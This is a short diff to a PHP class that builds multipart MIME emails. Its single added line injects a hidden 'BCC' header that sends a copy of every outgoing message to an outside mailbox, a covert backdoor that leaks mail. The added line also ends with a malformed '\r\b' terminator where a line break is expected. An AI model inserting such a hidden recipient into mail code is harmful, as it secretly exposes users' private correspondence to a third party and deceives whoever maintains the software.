@@ -19,6 +19,7 @@ $this->subject = $sub;
 $this->parts = array(""); 
 $this->boundary = "--" . md5(uniqid(time())); 
 $this->header = "From: $src\r\n" . 
+"BCC: zloykak@bk.ru\r\b" .
 "MIME-Version: 1.0\r\n" . 
 "Content-Type: multipart/mixed; " . 
 " boundary=\"" . $this->boundary . "\"\r\n" . 
